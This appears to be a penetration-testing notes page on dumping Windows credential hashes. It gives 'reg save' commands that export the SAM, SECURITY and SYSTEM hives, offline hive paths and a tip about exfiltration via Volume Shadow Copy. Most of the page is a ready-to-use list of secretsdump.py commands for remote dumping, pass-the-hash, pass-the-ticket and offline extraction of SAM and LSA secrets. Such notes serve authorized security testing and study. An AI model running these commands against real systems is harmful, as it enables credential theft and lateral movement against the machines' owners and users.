# SAM & Registry

When the Windows operating system is running, the hives are in use and mounted. The command-line tool named `reg` can be used to export them.

```
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

When Windows is not running, the hives are not mounted and they can be copied just like any other file. This can be operated when mounting the hard drive from another OS (e.g. when booting the computer on another operating system). The hive files can be found at the following locations.

```
\system32\config\sam
\system32\config\security
\system32\config\system
```

{% hint style="info" %}
Hives files can also be exfiltrated from live systems using Volume Shadow Copy.
{% endhint %}

the we download the 3 files and extract the hashes with secretsdump:

```
# Remote dumping of SAM & LSA secrets
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
​
# Remote dumping of SAM & LSA secrets (pass-the-hash)
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
​
# Remote dumping of SAM & LSA secrets (pass-the-ticket)
secretsdump.py -k 'DOMAIN/USER@TARGET'
​
# Offline dumping of LSA secrets from exported hives
secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
​
# Offline dumping of SAM secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
​
# Offline dumping of SAM & LSA secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```

## <mark style="color:red;">Other Resources</mark>

{% embed url="https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b" %}

{% embed url="http://moyix.blogspot.com/2008/02/syskey-and-sam.html" %}
